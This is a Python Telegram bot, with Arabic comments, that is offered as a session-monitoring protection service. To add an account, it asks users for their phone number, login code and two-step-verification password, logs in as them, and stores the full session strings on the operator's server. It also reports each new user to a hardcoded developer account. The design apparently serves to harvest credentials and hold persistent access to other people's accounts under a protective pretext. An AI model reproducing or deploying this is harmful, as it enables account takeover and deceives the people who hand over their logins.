import asyncio
import logging
import os
import re
from datetime import datetime
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
from motor.motor_asyncio import AsyncIOMotorClient
from dotenv import load_dotenv

# إعداد التسجيل (Logging)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# تحميل المتغيرات البيئية (اختياري إذا كنت تستخدم ملف .env)
load_dotenv()

# الإعدادات الأساسية - يجب تعبئتها من قبل المستخدم أو عبر متغيرات البيئة
API_ID = int(os.getenv('API_ID', '0'))  # ضع API_ID الخاص بك هنا
API_HASH = os.getenv('API_HASH', '')    # ضع API_HASH الخاص بك هنا
BOT_TOKEN = os.getenv('BOT_TOKEN', '')  # ضع توكن البوت هنا
MONGO_URI = os.getenv('MONGO_URI', 'mongodb://localhost:27017')
DEVELOPER_ID = int(os.getenv('DEVELOPER_ID', '778375826')) # معرف المطور لتلقي إشعارات دخول الأعضاء

# إعداد قاعدة البيانات
db_client = AsyncIOMotorClient(MONGO_URI)
db = db_client['telegram_manager_db']
users_col = db['users']
accounts_col = db['accounts']

# قاموس لتخزين حالات الجلسات النشطة لليوزربوت
active_userbots = {}

class TelegramManagerBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
        self.user_states = {} # لتتبع حالة المستخدم (مثل إدخال رقم الهاتف)

    async def start(self):
        logger.info("Starting Bot...")
        self.setup_handlers()
        await self.bot.run_until_disconnected()

    def setup_handlers(self):
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = event.sender_id
            # إشعار المطور بدخول عضو جديد
            if user_id != DEVELOPER_ID:
                try:
                    user = await event.get_sender()
                    name = f"{user.first_name} {user.last_name or ''}"
                    await self.bot.send_message(DEVELOPER_ID, f"👤 **عضو جديد دخل البوت:**\nالاسم: {name}\nالمعرف: `{user_id}`\nاليوزر: @{user.username or 'لا يوجد'}")
                except Exception as e:
                    logger.error(f"Error notifying developer: {e}")

            buttons = [
                [Button.inline("➕ إضافة حساب", b"add_account")],
                [Button.inline("📂 حساباتي", b"my_accounts")],
                [Button.inline("ℹ️ معلومات", b"info")]
            ]
            await event.respond("👋 **أهلاً بك في بوت إدارة حسابات التليجرام**\n\nيمكنك من خلال هذا البوت إضافة حساباتك ومراقبة الجلسات الجديدة وحذفها تلقائياً.", buttons=buttons)

        @self.bot.on(events.CallbackQuery())
        async def callback_handler(event):
            data = event.data
            user_id = event.sender_id

            if data == b"add_account":
                self.user_states[user_id] = {'step': 'waiting_phone'}
                await event.edit("📱 **يرجى إرسال رقم الهاتف مع رمز الدولة (مثال: +966500000000):**")

            elif data == b"my_accounts":
                accounts = await accounts_col.find({'owner_id': user_id}).to_list(length=100)
                if not accounts:
                    await event.edit("❌ ليس لديك حسابات مضافة حالياً.", buttons=[Button.inline("➕ إضافة حساب", b"add_account")])
                    return
                
                buttons = []
                for acc in accounts:
                    status = "✅ مراقب" if acc.get('monitoring', False) else "❌ غير مراقب"
                    buttons.append([Button.inline(f"👤 {acc['phone']} ({status})", f"manage_{acc['_id']}".encode())])
                buttons.append([Button.inline("🔙 رجوع", b"back_to_main")])
                await event.edit("📂 **قائمة حساباتك:**", buttons=buttons)

            elif data.startswith(b"manage_"):
                acc_id = data.decode().split('_')[1]
                acc = await accounts_col.find_one({'_id': acc_id, 'owner_id': user_id})
                if acc:
                    status_text = "✅ مراقبة الجلسات مفعلة" if acc.get('monitoring', False) else "❌ مراقبة الجلسات معطلة"
                    toggle_text = "🔴 تعطيل المراقبة" if acc.get('monitoring', False) else "🟢 تفعيل المراقبة"
                    buttons = [
                        [Button.inline(toggle_text, f"toggle_{acc_id}".encode())],
                        [Button.inline("🗑 حذف الحساب من البوت", f"delete_{acc_id}".encode())],
                        [Button.inline("🔙 رجوع", b"my_accounts")]
                    ]
                    await event.edit(f"⚙️ **إدارة الحساب: {acc['phone']}**\n\nالحالة: {status_text}", buttons=buttons)

            elif data.startswith(b"toggle_"):
                acc_id = data.decode().split('_')[1]
                acc = await accounts_col.find_one({'_id': acc_id, 'owner_id': user_id})
                if acc:
                    new_status = not acc.get('monitoring', False)
                    await accounts_col.update_one({'_id': acc_id}, {'$set': {'monitoring': new_status}})
                    
                    if new_status:
                        # تشغيل اليوزربوت للمراقبة
                        asyncio.create_task(self.start_userbot_monitoring(acc))
                    else:
                        # إيقاف اليوزربوت
                        if acc_id in active_userbots:
                            await active_userbots[acc_id].disconnect()
                            del active_userbots[acc_id]
                    
                    await event.answer(f"تم {'تفعيل' if new_status else 'تعطيل'} المراقبة بنجاح")
                    # إعادة عرض القائمة
                    await callback_handler(event) # استدعاء ذاتي لتحديث الواجهة

            elif data == b"back_to_main":
                await start_handler(event)

        @self.bot.on(events.NewMessage())
        async def message_handler(event):
            user_id = event.sender_id
            if user_id not in self.user_states:
                return

            state = self.user_states[user_id]
            text = event.text

            if state['step'] == 'waiting_phone':
                phone = re.sub(r'\s+', '', text)
                if not phone.startswith('+'):
                    await event.respond("❌ يرجى إرسال الرقم بالصيغة الدولية (يبدأ بـ +)")
                    return
                
                client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
                await client.connect()
                try:
                    send_code = await client.send_code_request(phone)
                    self.user_states[user_id] = {
                        'step': 'waiting_code',
                        'phone': phone,
                        'phone_code_hash': send_code.phone_code_hash,
                        'client': client
                    }
                    await event.respond(f"📩 تم إرسال كود التحقق إلى {phone}.\nيرجى إرسال الكود هنا:")
                except Exception as e:
                    await event.respond(f"❌ خطأ: {str(e)}")
                    await client.disconnect()

            elif state['step'] == 'waiting_code':
                code = text.strip()
                client = state['client']
                phone = state['phone']
                phone_code_hash = state['phone_code_hash']

                try:
                    await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                    await self.save_account(user_id, phone, client.session.save())
                    await event.respond(f"✅ تم إضافة الحساب {phone} بنجاح!")
                    del self.user_states[user_id]
                except SessionPasswordNeededError:
                    self.user_states[user_id]['step'] = 'waiting_password'
                    await event.respond("🔐 الحساب محمي بكلمة سر (التحقق بخطوتين).\nيرجى إرسال كلمة السر:")
                except PhoneCodeInvalidError:
                    await event.respond("❌ الكود غير صحيح، حاول مرة أخرى:")
                except Exception as e:
                    await event.respond(f"❌ حدث خطأ: {str(e)}")

            elif state['step'] == 'waiting_password':
                password = text.strip()
                client = state['client']
                phone = state['phone']
                try:
                    await client.sign_in(password=password)
                    await self.save_account(user_id, phone, client.session.save())
                    await event.respond(f"✅ تم إضافة الحساب {phone} بنجاح!")
                    del self.user_states[user_id]
                except PasswordHashInvalidError:
                    await event.respond("❌ كلمة السر غير صحيحة، حاول مرة أخرى:")
                except Exception as e:
                    await event.respond(f"❌ حدث خطأ: {str(e)}")

    async def save_account(self, owner_id, phone, session_str):
        acc_id = str(datetime.now().timestamp()).replace('.', '')
        # الحصول على الجلسات الحالية لتجنب حذفها لاحقاً
        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
        await client.connect()
        authorizations = await client(functions.account.GetAuthorizationsRequest())
        existing_sessions = [auth.hash for auth in authorizations.authorizations]
        await client.disconnect()

        await accounts_col.insert_one({
            '_id': acc_id,
            'owner_id': owner_id,
            'phone': phone,
            'session': session_str,
            'monitoring': False,
            'existing_sessions': existing_sessions,
            'added_at': datetime.now()
        })

    async def start_userbot_monitoring(self, acc_data):
        acc_id = acc_data['_id']
        phone = acc_data['phone']
        owner_id = acc_data['owner_id']
        
        if acc_id in active_userbots:
            return

        logger.info(f"Starting monitoring for {phone}")
        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            logger.error(f"Session for {phone} is no longer valid")
            await self.bot.send_message(owner_id, f"⚠️ الجلسة الخاصة بالحساب {phone} انتهت، يرجى إعادة تسجيل الدخول.")
            return

        active_userbots[acc_id] = client

        # مهمة دورية لفحص الجلسات الجديدة
        async def check_sessions_loop():
            while acc_id in active_userbots and (await accounts_col.find_one({'_id': acc_id}))['monitoring']:
                try:
                    authorizations = await client(functions.account.GetAuthorizationsRequest())
                    acc = await accounts_col.find_one({'_id': acc_id})
                    existing_hashes = acc.get('existing_sessions', [])
                    
                    for auth in authorizations.authorizations:
                        if auth.hash not in existing_hashes:
                            # جلسة جديدة!
                            # استخراج معلومات الجلسة
                            info = (
                                f"🚨 **تنبيه: تم اكتشاف جلسة جديدة!**\n\n"
                                f"📱 الحساب: {phone}\n"
                                f"💻 الجهاز: {auth.device_model}\n"
                                f"🌐 النظام: {auth.platform}\n"
                                f"📍 الموقع: {auth.country}\n"
                                f"🌐 IP: {auth.ip}\n"
                                f"⏰ الوقت: {auth.date_created}\n\n"
                                f"🛡 **يتم الآن حذف الجلسة تلقائياً...**"
                            )
                            await self.bot.send_message(owner_id, info)
                            
                            try:
                                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                                await self.bot.send_message(owner_id, "✅ تم حذف الجلسة المشبوهة بنجاح.")
                            except Exception as e:
                                await self.bot.send_message(owner_id, f"❌ فشل حذف الجلسة: {str(e)}")

                    await asyncio.sleep(30) # فحص كل 30 ثانية
                except Exception as e:
                    logger.error(f"Error in monitoring loop for {phone}: {e}")
                    await asyncio.sleep(60)

        asyncio.create_task(check_sessions_loop())

if __name__ == '__main__':
    # إنشاء مجلد الجلسات إذا لم يكن موجوداً
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
        
    manager = TelegramManagerBot()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(manager.start())
